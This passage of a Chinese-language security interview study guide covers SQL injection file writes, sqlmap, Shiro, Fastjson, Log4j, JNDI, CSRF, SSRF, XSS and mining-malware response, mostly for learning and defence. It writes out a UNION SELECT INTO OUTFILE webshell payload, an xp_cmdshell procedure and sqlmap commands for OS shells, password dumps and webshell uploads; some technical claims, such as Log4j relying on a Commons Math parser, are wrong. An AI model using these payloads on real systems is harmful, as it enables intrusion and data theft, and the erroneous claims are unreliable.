<li>load_file () 读文件</li>
</ul>
<p>into outfile /into dumpfile 写文件</p>
<p>条件： </p>
<ul>
<li>对 web 目录具有读写权限 </li>
<li>知道文件绝对路径 </li>
<li>能够使用联合查询（sql 注入时）</li>
</ul>
<p>outfile 与 dumpfile 的区别：</p>
<ul>
<li>dumpfile 适用于二进制文件，它会将目标文件 写入同一行内，outfile 则更适用于文本文件。</li>
</ul>
<p>命令：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">select load_file(‘d:/phpstudy/www/123.php’); 
select ‘123’ into outfile ‘d:/phpstudy/www/123.php’; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<p><strong>7、sql注入如何写shell</strong></p>
<p><strong>root权限，网络路径：</strong></p>
<p>在SQL注入攻击中，如果攻击者成功地注入了一些恶意的SQL代码，则可以利用这些漏洞来执行各种操作，包括编写shell。以下是攻击者可能使用的几种技术：</p>
<ol>
<li>利用UNION SELECT语句：通过构造一个带有UNION SELECT语句的SQL查询，攻击者可以在结果集中插入一些命令，并通过这些命令来编写shell，例如在 <strong>MySQL</strong> 中可以使用 <strong>INTO OUTFILE</strong> 来将结果输出到文件中。</li>
</ol>
<p>例如，以下语句可以在MySQL中编写shell：</p>
<pre class="line-numbers language-none"><code class="language-none">http://example.com/products.php?id=1 UNION SELECT "&lt;?php system($_GET['cmd']); ?&gt;",2 INTO OUTFILE "/var/www/html/shell.php";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol>
<li>利用<strong>LOAD_FILE</strong>函数：如果应用程序允许使用LOAD_FILE函数加载文件，攻击者可以使用该函数来读取并执行任意的本地shell脚本文件。</li>
</ol>
<p>例如，在MySQL中，攻击者可以使用以下代码来读取并执行一个本地shell脚本：</p>
<pre class="line-numbers language-none"><code class="language-none">http://example.com/products.php?id=-1' UNION SELECT LOAD_FILE('/path/to/malicious/script.sh'),'',''<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol>
<li>利用指定数据库的存储过程：攻击者可以使用存储过程来创建和执行恶意的shell脚本，例如在Microsoft SQL Server中，可以使用以下代码来创建并执行一个命令解释器：</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">CREATE PROCEDURE sp_ExecCmd (@cmd varchar(1000))
AS
BEGIN
DECLARE @ret int
EXEC @ret = master..xp_cmdshell @cmd
END
GO

EXEC sp_ExecCmd 'command'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>攻击者利用SQL注入漏洞来执行命令或编写shell是非常危险的，因此，在编写应用程序时必须采用适当的安全措施，例如对所有输入数据进行严格的验证和过滤，并使用参数化查询来避免SQL注入攻击。</p>
<p><strong>8、sqlmap中risk和levels区别</strong></p>
<p>在SQL注入扫描器sqlmap中，-r 参数表示风险等级，-level 参数表示扫描等级。这两个参数的区别如下：</p>
<ol>
<li>风险等级（-r 或 –risk）：表示发现漏洞的可能性，取值范围是 1-3，越高表示发现漏洞的可能性越大。在较低的风险等级下，sqlmap只执行少量测试，而在更高的风险等级下，sqlmap会进行更多的测试。</li>
<li>扫描等级（-level 或 –level）：表示扫描深度和测试量，取值范围是 1-5，越高表示扫描深度越深、测试量越大。在较低的扫描等级下，sqlmap只执行一些基本的测试，而在更高的扫描等级下，sqlmap会执行更多的测试，并探测更多的漏洞类型。</li>
</ol>
<p>总之，在使用 sqlmap 进行 SQL 注入扫描时，我们需要根据情况调整风险等级和扫描等级，以达到最优的扫描效果。同时，还需要注意 sqlmap 执行测试过程中对目标系统造成的影响，避免对目标系统产生不必要的影响。</p>
<p><strong>sqlmap常用命令</strong></p>
<p>SQLMap是一种常用的自动化SQL注入攻击工具，可以对目标网站进行全自动的SQL注入漏洞扫描和利用。以下是一些SQLMap的常用命令：</p>
<ol>
<li>基本扫描命令：</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://target.com/page.php?id=1" --dbs &nbsp; &nbsp; &nbsp; # 获取所有可利用的数据库sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables  # 获取指定数据库中的所有表sqlmap -u "http://target.com/page.php?id=1" -D dbname -T tablename --columns &nbsp; # 获取指定表中的所有列sqlmap -u "http://target.com/page.php?id=1" -D dbname -T tablename -C columnname --dump &nbsp;  # 获取指定列中的数据<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>POST请求和Cookie：</p>
<pre class="line-numbers language-none"><code class="language-none">
sqlmap -u "http://target.com/login.php" --data="username=admin&amp;password=1234" --cookie="PHPSESSID=abcd1234" --level=5 --risk=3   # 向登录页面发送POST请求和Cookie，并对网站进行深度扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>手动指定注入点：</p>
<pre class="line-numbers language-none"><code class="language-none">
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql --technique=T --random-agent --level=5 --risk=3 --current-db --users --passwords --privileges --threads=10 --batch --skip-waf --tamper=randomcomments -p id   # 指定注入点为id参数，绕过WAF设置，使用随机HTTP头和注入负载进行扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>高级命令：</p>
<pre class="line-numbers language-none"><code class="language-none">
sqlmap -u "http://target.com/page.php?id=1" --os-shell     # 获取操作系统Shell
sqlmap -u "http://target.com/page.php?id=1" --os-pwn       # 获取操作系统级别的访问权限
sqlmap -u "http://target.com/page.php?id=1" --file-read="/var/www/config.php"  # 读取指定文件内容
sqlmap -u "http://target.com/page.php?id=1" --file-write="/var/www/shell.php" --file-dest="/var/www/html/" --tamper="apostrophemask.py" --batch   # 向目标服务器写入Web Shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p><strong>sqlmap –os-shell 原理了解吗？</strong></p>
<p>sqlmap 的–os-shell 在 mysql 数据库中的原理，其实就是往服务器上写入了两个  php，其中一个给我们提供了文件上传的页面，可以通过这个上传页面上传脚本文件到当前目录下。另外一个则是返回了可以让我们执行系统命令的命令行，命令行也可以在网页 url 中通过对 cmd 参数传参执行系统命令。</p>
<p><strong>SQL server  - CVE</strong> </p>
<p><strong>原理：</strong>当SQL Server错误地处理页面请求时,会触发一个远程代码执行漏洞。成功利用该漏洞的攻击者会在当前用户的上下文中运行任意代码,如果当前用户使用管理用户权限登录,那么攻击者就可以控制受影响的系统。</p>
<p>SQL Server Reporting Services**(SSRS)<strong>提供了一组本地工具和服务，用于创建、部署和管理移动报告和分页报告。</strong>SSRS** Web应用程序中的功能允许低特权用户帐户通过利用反序列化问题在服务器上运行代码。只有授权用户才能访问该应用程序，但是最低权限也可利用此漏洞。</p>
<p>获得低权限的攻击者向受影响版本的SQL Server的Reporting Services实例发送精心构造的请求，可利用此漏洞在报表服务器服务帐户的上下文中执行任意代码</p>
<p><strong>3.2 防护建议</strong></p>
<p>由于攻击者可通过对请求数据包编码绕过Web应用防火墙的防护，强烈建议用户安装补丁程序进行修复。禁止匿名访问，确保只有经过身份验证的用户才能访问相关应用；如果怀疑服务器已经受到威胁，除安装相应补丁外，请及时更改服务器的账户口令，防止被攻击者利用。</p>
<p><strong>SQL 查询异常流量分析思路</strong></p>
<p>1、数据库短时间内查询增多有可能遭遇到了【扫描】或者【sql 注入测试】，可以结合流量分析工具进行研判</p>
<p>2、【select】 和【union】为数据库查询语句特征，当这两者数量出现次数较多而且差异较小可能存在 SOL 注入漏洞或正在被扫描器扫描，可监控这两个关键字，但还需 要进一步查看具体请求参数。</p>
<p>如：                        </p>
<p>（1) 使用 wireshark 打开抓取后的流量包                        </p>
<p>（2) 对于抓取到的数据包筛选出 HTTP 协议包，在统计处筛选出短时间内流量较大的 IP </p>
<p>（3）尝试定位一些基本的注入特征（select、union、（）、/*、sleep 等）</p>
<h2 id="一、木马挖矿特征分析"><a href="#一、木马挖矿特征分析" class="headerlink" title="一、木马挖矿特征分析"></a>一、木马挖矿特征分析</h2><p>当服务器或PC处于什么样的状态时，我们可以判定为被挖矿。通常来说，当我们的服务器或PC资源(CPU)使用率接近或超过100%，并持续高居不下导致服务器或PC操作延缓，我们就可以判定被挖矿。</p>
<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731170128534.png" alt="image-20230731170128534"></p>
<p>看日志有没有异常的连接或者是网络端口</p>
<p>看是什么类型，木马的话就看他的可以的端口可疑的进程</p>
<p>看是什么引起的，能不能手动关掉，不能的话用工具什么的，清除掉再加固。</p>
<h3 id="一、Linux确认挖矿"><a href="#一、Linux确认挖矿" class="headerlink" title="一、Linux确认挖矿"></a><strong>一、Linux确认挖矿</strong></h3><p>a. 使用<code>top</code>命令查看系统性能，找出消耗资源较高的进程PID；</p>
<p>b. 根据获取的PID信息利用<code>ps -ef -p PID</code>命令找出系统进程详细信息；</p>
<p>c. 根据进程详细信息定位到文件位置，进入文件位置进行文件分析，确认是否属于挖矿程序。</p>
<p>d.crontab查看计划任务</p>
<p>netstat查看端口</p>
<p>停止服务：<code>systemctl stop *.service</code>；</p>
<ul>
<li>杀掉进程：<code>kill 9 PID</code>，很多时候不光杀掉一个进程；</li>
<li>删除文件：<code>rm -fr abnormal_file</code>，删除文件时可以使用<code>find / -name abnormal_file</code>查找出系统中所有的恶意文件；</li>
<li>清理定时任务：<code>crontab -e</code>；</li>
</ul>
<h3 id="一、Windows确认挖矿"><a href="#一、Windows确认挖矿" class="headerlink" title="一、Windows确认挖矿"></a><strong>一、Windows确认挖矿</strong></h3><ul>
<li><p>使用图形化界面分析确认</p>
<p>a. 打开<code>任务管理器</code>：<code>Ctrl + Alt + Delete</code> 快捷键 或者 <code>win + r</code> 快捷键，输入 <code>taskmgr</code>；</p>
<p>b. 在<code>任务管理器</code>中找到<code>资源管理器</code>；</p>
<p>c. 通过<code>资源管理器</code>找到占用CPU资源较高的服务或进程，获取其PID信息；</p>
<p>d. 利用获取的PID信息在<code>任务管理器</code>中的<code>详细信息</code>一栏中找到对应的程序，右键<code>打开文件位置</code>，获取异常文件目录；</p>
<p>e. 进入到异常文件目录中，对文件进行分析，确认是否属于挖矿程序；</p>
<p>f. 确认挖矿程序后，先对挖矿程序进行备份。然后先关闭对应的服务与进程，再删除对应的定时任务，最后删除对应的文件。在删除文件之后，反向再查询一遍定时任务、进程与服务，最好是在间隔一定时间段后再复查一次</p>
<p>应急响应流程：</p>
</li>
</ul>
<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731170501965.png" alt="image-20230731170501965"></p>
<h2 id="一、java漏洞："><a href="#一、java漏洞：" class="headerlink" title="一、java漏洞："></a>一、java漏洞：</h2><p>shiro，fastjson之类的，常问这俩。</p>
<h3 id="一、shiro"><a href="#一、shiro" class="headerlink" title="一、shiro"></a>一、shiro</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731170615823.png" alt="image-20230731170615823"></p>
<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731173919178.png" alt="image-20230731173919178"></p>
<p><strong>平常怎么去发现 Shiro 漏洞的？</strong></p>
<p>Apache Shiro 是一个 Java 安全框架，执行身份验证、授权、密码和会话管理。apacheShiro 框架提供了记住我（RememberMe）的功能，关闭了浏览器下次再打开时还是能记住你是谁，下次访问时无需再登录即可访问。</p>
<p>shiro 反序列化漏洞：shiro 在 CookieRememberMeManaer 类中将 cookie 中<strong>rememberMe  字段内容分别进行序列化、AES 加密、Base64 编码操作</strong>。攻击者构造一个恶意的对象，并且<strong>对其序列化，AES 加密，base64 编码后，作为 cookie 的 rememberMe 字段发送。Shiro 将 rememberMe 进行解密并且反序列化，最终造成反序列化漏洞。</strong></p>
<p>登陆失败时候会返回 rememberMe=deleteMe 字段或者使用 shiroScan 被动扫描去发现</p>
<p>完整：</p>
<p>未登陆的情况下，请求包的 cookie 中没有 rememberMe 字段，返回包 set-Cookie 里也没有 deleteMe 字段</p>
<p>登陆失败的话，不管勾选 RememberMe 字段没有，返回包都会有 rememberMe=deleteMe 字段</p>
<p>不勾选 RememberMe 字段，登陆成功的话，返回包 set-Cookie 会有 rememberMe=deleteMe 字段。但是之后的所有请求中 Cookie 都不会有 rememberMe 字段</p>
<p>勾选 RememberMe 字段，登陆成功的话，返回包 set-Cookie 会有 rememberMe=deleteMe 字段，还会有 rememberMe 字段，之后的所有请求中 Cookie 都会有 rememberMe 字段</p>
<p><strong>shiro 有几种漏洞类型</strong></p>
<p>shiro 550</p>
<p>shiro 721</p>
<p>Apache Shiro 框架提供了记住我的功能（RemeberMe），用户登录成功后会生成经过加密并编码的 cookie。cookie 的 key 为  RemeberMe，cookie 的值是经过对相关信息进行序列化，然后使用 aes 加密，最后在使用 base64 编码处理形成的</p>
<p>在服务端接收 cookie 值时，按以下步骤解析：</p>
<blockquote>
<p>检索 RemeberMe cookie 的值</p>
<p>Base 64 解码</p>
<p>使用 ACE 解密（加密密钥硬编码）</p>
<p>进行反序列化操作（未作过滤处理）</p>
</blockquote>
<p>在调用反序列化的时候未进行任何过滤，导致可以触发远程代码执行漏洞</p>
<p>用户登陆成功后会生成经过加密并编码的  cookie，在服务端接收 cookie 值后，Base64 解码 –&gt;AES 解密 –&gt; 反序列化。攻击者只要找到 AES  加密的密钥，就可以构造一个恶意对象，对其进行序列化 –&gt;AES 加密 –&gt;Base64 编码，然后将其作为 cookie 的  rememberMe 字段发送，Shiro 将 rememberMe 进行解密并且反序列化，最终造成反序列化漏洞。</p>
<p><strong>shiro550和721的区别</strong></p>
<p>加密位数不一样</p>
<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731171017047.png" alt="image-20230731171017047"></p>
<h3 id="一、Fastjson-漏洞"><a href="#一、Fastjson-漏洞" class="headerlink" title="一、Fastjson 漏洞"></a>一、Fastjson 漏洞</h3><p>利用：配合JNDI注入</p>
<p><strong>原理：</strong></p>
<p>在请求包里面中发送恶意的 json 格式 payload，漏洞在处理 json 对象的时候，没有对 @type 字段进行过滤，从而导致攻击者可以传入恶意的  TemplatesImpl 类，而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes 生成 java  实例，这就达到 fastjson 通过字段传入一个类，再通过这个类被生成时执行构造函数。</p>
<p>FastJson 是一个由阿里巴巴研发的 java 库，可以把 java 对象转换为 JSON 格式，也可以把 JSON 字符串转换为对象。</p>
<p>通俗理解就是：漏洞利用 fastjson autotype 在处理 json 对象的时候，未对 @type 字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程 rmi 主机，通过其中的恶意类执行代码。</p>
<p>攻击者通过这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步对服务器数据进行修改，增加，删除等操作，对服务器造成巨大影响。</p>
<p>Fastjson RCE 的本质就是在反序列化时会调用目标类的 setter 方法。以 com.sun.rowset.JdbcRowSetImpl Gadget 为例，类中的 setAutoCommit 方法中通过 connect 方法调用了 lookup 方法，且 lookup 方法的参数又能通过  setDataSourceName 方法设置，即其参数可控。那么就会导致 JNDI 注入，最终实现任意命令执行。</p>
<p>Java 处理 Json 格式数据有三个比较流行的类库：</p>
<ul>
<li>Gson (google 维护) </li>
<li>Jackson</li>
<li>Fastjson</li>
</ul>
<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731170624443.png" alt="image-20230731170624443"></p>
<h3 id="二、log4j"><a href="#二、log4j" class="headerlink" title="二、log4j"></a>二、log4j</h3><p><strong>payload关键字：jndi</strong></p>
<p><strong>原理：</strong></p>
<p>Apache Log4j2 是一个基于 Java 的日志记录工具。Apache Log4j 2.x &lt;= <strong>2.14.1</strong> 版本存在远程代码执行漏洞。  漏洞的主要原因是 log4j2  的<strong>接收器对于不可靠来源的输入没有过滤</strong>，攻击者则可以利用此特性通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。由于 Log4j2  组件在处理程序日志记录时存在 JNDI 注入缺陷，未经授权的攻击者利用该漏洞，可向服务器发送恶意的数据，触发 log4j2  组件的缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。</p>
<p>为了输出日志时能够方便地输出任意位置的 java 对象，Log4j2 引入了一个叫 <strong>Lookup  的统一接口</strong>。这个接口<strong>允许</strong>在写日志的时候，按照<strong>具体的实现逻辑</strong>去查找对象的位置，并输出对象的内容。这里的对象通常在内存中，但由于 java  支持对象的序列化 / 反序列化，它也可以存储在硬盘文件里，甚至是远程服务器上。</p>
<p>我们提到的 <strong>JNDI 就是对 Lookup  接口的一种实现</strong>。其本身也是一个接口，提供了命名关键字到对象的<strong>映射目录</strong>，允许开发者提供一个名称，即可获取到对象的内容。LDAP，即<strong>轻量级目录访问协议</strong>，是 JNDI 的一种底层实现，它可以让我们方便的<strong>查询分布式数据库</strong>。既然是分布式的，LDAP  <strong>允许从远程服务器加载对象</strong>。而这里加载对象时使用的不是一般的<strong>反序列化方法</strong>，而是通过<strong>「命名引用」功能</strong>，<strong>支持直接从远程下载 class  文件并加载对象</strong>。</p>
<p>于是，Log4j2 中就暗含了注入漏洞：<strong>允许传入参数解析为 LDAP 协议，从远程服务器下载 class 文件并执行</strong>。这个功能本来是为了方便开发，使 java 对象位置对上层应用透明，却不料酿成大祸</p>
<p>Log4j依赖于Apache Commons Math库中的一个子模块，即Math Expression Parser（MEP）库，以解析日志消息中的数学表达式。这个库使用了JNDI（Java命名和目录接口）技术，<strong>JNDI允许开发人员将Java对象绑定到命名空间中，以供其他Java应用程序使用</strong>。</p>
<p>攻击者可以通过构造特制的请求，将恶意的JNDI名称注入到Log4j中，从而诱骗Log4j调用该JNDI名称代表的对象，例如远程服务器上的恶意Java类。当Log4j尝试解析JNDI名称时，它会触发恶意JNDI资源的加载，并在其中执行恶意代码。</p>
<p>攻击者可以利用此漏洞来执行各种攻击，包括但不限于：</p>
<ol>
<li>远程代码执行：攻击者可以利用此漏洞在目标系统上执行任意代码，可能导致机密信息泄露、数据损坏和系统崩溃等问题。</li>
<li>远程命令执行：攻击者可以利用此漏洞在目标系统上执行任意命令，例如下载和安装恶意软件、创建后门访问等。</li>
</ol>
<p><strong>设备上出现log4j，怎么判断攻击成功？</strong></p>
<p>如果在设备上出现了log4j，则说明攻击者可能利用Log4j漏洞进行攻击，此时可以通过以下方式判断是否真的发生了攻击：</p>
<ol>
<li>检查服务器日志：如果攻击成功，一般会在服务器日志中留下明显的痕迹，如未经授权的文件访问、操作系统命令执行等。建议定期检查服务器日志，尤其是涉及敏感数据和关键操作的日志。</li>
<li>检查网络流量：攻击者在远程操纵受害设备时，一般需要与设备进行网络通信，因此可以通过检查网络流量来判断<strong>是否有异常的数据传输行为</strong>。建议采用<strong>网络监控工具</strong>对网络流量进行实时监控，并对异常流量进行警报和记录。</li>
<li>检查系统进程：攻击者在利用漏洞进行攻击时，可能需要启动或修改一些系统进程，因此可以通过检查系统进程列表来寻找<strong>异常行为</strong>。建议使用系统<strong>监控工具</strong>对系统进程进行实时监控，并对异常进程进行警报和记录。</li>
</ol>
<p>需要注意的是，出现了Log4j并不意味着攻击一定已经成功，也可能只是正常业务应用中使用了Log4j功能。因此，在判断是否受到攻击时，应该综合考虑多种因素，并采取相应的安全措施。</p>
<h2 id="三、JNDI-注入"><a href="#三、JNDI-注入" class="headerlink" title="三、JNDI 注入"></a>三、JNDI 注入</h2><p>JNDI RCE 漏洞产生的原因就在于当我们在注册 RMI 服务时，可以指定 Codebase url，也就是远程要加载类的位置，设 置该属性可以让 JDNI 应用程序在加载时去寻找我们指定的类 ( 例如：<a href="http://ip:port/EvilObject.class">http://ip:port/EvilObject.class</a>) 。 </p>
<p>这里还有一个比较重要的点，也是触发恶意代码的点。就是当 JNDI 应用程序通过 lookup (RMI 服务的地址) 方法调用指 定 Codebase url  上的类后，会调用被远程调用类的构造方法，所以如果我们将恶意代码放在被远程调用类的构造方法中时， 漏洞就会触发。</p>
<h2 id="一、CSRF漏洞"><a href="#一、CSRF漏洞" class="headerlink" title="一、CSRF漏洞"></a>一、<strong>CSRF</strong>漏洞</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802110425758.png" alt="image-20230802110425758"></p>
<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802110531643.png" alt="image-20230802110531643"></p>
<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802110837789.png" alt="image-20230802110837789"></p>
<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802111014210.png" alt="image-20230802111014210"></p>
<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802111259860.png" alt="image-20230802111259860"></p>
<p>php中有<strong>CSP</strong>，java应该应该也有类似的，开启后没法进行外站应用</p>
<p>通常出现在数据处理的地方，账户登录，转账，修改信息</p>
<h2 id="一、SSRF"><a href="#一、SSRF" class="headerlink" title="一、SSRF"></a>一、SSRF</h2><p>SSRF 的工作原理</p>
<ol>
<li><strong>攻击者构造特定请求</strong>：攻击者构造特定的请求，该请求被发送到目标应用服务器。</li>
<li><strong>目标服务器向内部资源发起请求</strong>：目标应用服务器接收到攻击者的请求后，被引导向内部资源发起请求。</li>
<li><strong>收集敏感信息</strong>：通过构造的请求，攻击者可能能够访问服务器无法直接访问的内部资源，如数据库、缓存服务器、内部网络等。</li>
<li><strong>执行进一步攻击</strong>：利用 SSRF，攻击者甚至可以绕过防火墙，执行进一步的攻击，例如对内部服务进行端口扫描、远程命令执行等。</li>
</ol>
<p>SSRF 攻击的常见场景</p>
<ul>
<li>在 Web 应用中，通过 URL 参数来获取外部资源，如图片、文件等。</li>
<li>使用服务器作为代理来访问第三方服务。</li>
<li>通过 Webhooks 接收来自第三方服务的请求。</li>
</ul>
<p>SSRF 攻击的危害</p>
<ul>
<li>泄露内部网络架构和敏感信息。</li>
<li>进行端口扫描和远程命令执行。</li>
<li>绕过 IP 白名单和防火墙。</li>
<li>可能导致 DDoS 攻击。</li>
</ul>
<p>SSRF 的防护措施</p>
<ul>
<li>限制从服务器端发起的外部请求，特别是对内部资源的访问。</li>
<li>对外部输入进行严格的校验和过滤。</li>
<li>使用安全编程技术，避免使用用户的输入来直接构造请求。</li>
<li>通过防火墙等安全措施，限制服务器对内部和外部资源的访问。</li>
<li>对敏感操作进行适当的认证和授权。</li>
</ul>
<p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230802185129898.png" alt="image-20230802185129898"></p>
<h2 id="一、XSS漏洞"><a href="#一、XSS漏洞" class="headerlink" title="一、XSS漏洞"></a>一、XSS漏洞</h2><p>原理：</p>
<p>XSS 主要使用 javascript，javascript 可以非常灵活的操作 html、css 和浏览器。 </p>
<p>XSS 就是将恶意代码注入到网页中，以达到攻击的效果。</p>
<p>当用户访问被 XSS 注入的网页，XSS 代码就会被提取出来 用户浏览器就会解析这段 XSS 代码，也就是说用户被攻击了  用户最简单的动作就是使用浏览器上网，并且浏览器中有 javascript 解释器， 可以解析  javascript，然而浏览器不会判断代码是否恶意。</p>
<p>微博、留言板、聊天室等等<strong>收集用户输入的地方</strong>， 都有遭受 XSS 的风险，只要没有对用户的输入进行严格过滤，就会被 XSS 。</p>
<p>XSS的种类有哪些,区别和修复方式：</p>
<p>种类：存储型，反射型，DOM型<br>区别：存储型:常出现在信息修改添加等地方，导致恶意代码被存储在数据库中，每当被攻击者访问到后就会触发执行；反射型：常出现在url中，一般需要攻击者提前构造好恶意链接，欺骗用户点击，触发攻击代码；DOM型：攻击代码在url中，然后输出在了浏览器的DOM节点中。简单比较会发现，存储和反射都经过服务器，而DOM是纯前端。修复：对输入数据进行Html Encode 处理，白名单过滤，过滤JavaScript 事件的标签，开启http-only，装WAF等。</p>
<p><strong>XSS 漏洞危害</strong></p>
<ul>
<li>盗取各种用户账号 </li>
<li>窃取用户 Cookie 资料，冒充用户身份进入网站 </li>
<li>劫持用户会话，执行任意操作 </li>
<li>刷流量，执行弹窗广告 </li>
<li>传播蠕虫病毒</li>
</ul>
<p><strong>XSS 漏洞类型</strong></p>
<ul>
<li><p>反射型 XSS</p>
<p>搜索框，用户登录 </p>
<p>非持久性、参数跨站脚本 </p>
<p>窃取用户 cookie 或进行钓鱼欺骗</p>
</li>
<li><p>存储型 XSS</p>
<p>留言板，评论，博客日志 </p>
<p>持久性跨站脚本，更具威胁性 </p>
<p>渗透网站、挂马、蠕虫病毒、钓鱼</p>
</li>
<li><p>DOM 型 XSS</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
<span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> str <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"&lt;a href='"</span><span class="token operator">+</span>str<span class="token operator">+</span><span class="token string">"'&gt;testLink&lt;/a&gt;"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>s<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>write<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
<h2 id="二、文件上传"><a href="#二、文件上传" class="headerlink" title="二、文件上传"></a>二、文件上传</h2><p><strong>文件上传和命令执行，有看过相关日志吗？</strong></p>
<p>文件上传和命令执行都是常见的 Web 应用程序安全漏洞，攻击者利用漏洞上传恶意文件或执行恶意代码，从而获取服务器上的敏感数据或控制服务器。在进行安全管理时，通常可以通过查看相关日志来发现潜在的安全威胁。</p>
<p>对于文件上传漏洞，以下是一些可能存在的相关日志：</p>
<ol>
<li>文件上传日志：Web 服务器或应用服务器上的访问日志中可能包含上传文件的信息，例如上传时间、上传文件名称、上传文件大小等。</li>
<li>访问控制日志：如果应用程序实现了文件上传的访问控制机制，记录访问控制的日志可能包含了上传文件的信息，例如上传人员、上传时间、上传 IP 地址等。</li>
<li>安全审计日志：如果使用了安全审计工具，可以记录文件上传操作的详细信息，例如上传文件的路径、上传文件的内容等。</li>
</ol>
<p>对于命令执行漏洞，以下是一些可能存在的相关日志：</p>
<ol>
<li>访问日志：Web 服务器或应用服务器上的访问日志中可能包含恶意代码执行的信息，例如请求 URL、HTTP 请求方法、HTTP 状态码等。</li>
<li>异常日志：应用程序中的异常日志可以记录可能存在的恶意代码执行异常信息，例如异常类型、异常堆栈等。</li>
<li>安全审计日志：如果使用了安全审计工具，可以记录恶意代码执行的详细信息，例如恶意代码的来源、执行时间、执行结果等。</li>
</ol>
<p>需要注意的是，以上只是其中一部分可能存在的相关日志，实际应用中还有更多可能的日志类型。在进行文件上传和命令执行漏洞的检测和防御时，需要根据具体应用进行评估和选择，并及时发现和修复潜在的安全威胁。</p>
<p><strong>你能说明文件上传的原理吗？</strong></p>
<ol>
<li>客户端向服务器发送一个包含文件数据的 POST 请求。</li>
<li>服务器接收请求并解析其中的文件数据。</li>
<li>服务器将文件保存在指定的目录下，并返回处理结果给客户端。</li>
</ol>
<p>具体来说，文件上传流程一般如下：</p>
<ol>
<li>用户在 Web 页面上选择要上传的文件，并提交表单。</li>
<li>浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。</li>
<li>Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。</li>
<li>服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。</li>
